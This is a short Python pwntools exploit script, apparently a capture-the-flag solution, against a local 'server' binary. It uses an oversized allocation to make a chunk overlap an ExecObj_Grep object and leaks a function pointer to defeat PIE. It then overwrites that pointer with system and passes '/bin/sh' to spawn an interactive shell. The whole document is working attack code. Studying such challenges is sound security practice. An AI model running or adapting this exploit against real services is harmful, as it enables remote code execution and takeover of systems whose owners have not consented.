from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

elf = ELF('./server')
context.binary = elf
#useful address
ExecObj = elf.symbols['ExecObj_Grep_run']
log.info(f'ExecObj_Grep_run: {hex(ExecObj)}')   

size_overflow = 2**60

p = remote('localhost', 10000)

p.recvline()
p.sendline(b'oa' + str(size_overflow).encode()) # allocate fake huge chunk
p.recvline()
p.sendline(b'oeg0') # allocate ExecObj_Grep, previous chuck overlaps it
p.recvline()
p.sendline(b'r0,2') # read back function pointer to leak PIE
leak_pie = u64(p.recvline().strip().ljust(8, b'\x00'))
log.info(f'PIE leak: {hex(leak_pie)}')

base = leak_pie - ExecObj
log.info(f'Base addr: {hex(base)}')
elf.address = base
system = elf.plt['system']
log.info(f'system addr: {hex(system)}')
p.sendline(b'a0,2=' + p64(system)) # overwrite function pointer with system
p.sendline(b'a0,0=/bin/sh\x00') # write /bin/sh to argument
p.sendline(b'r1') # trigger ExecObj_Grep_run
p.interactive() # happy hacking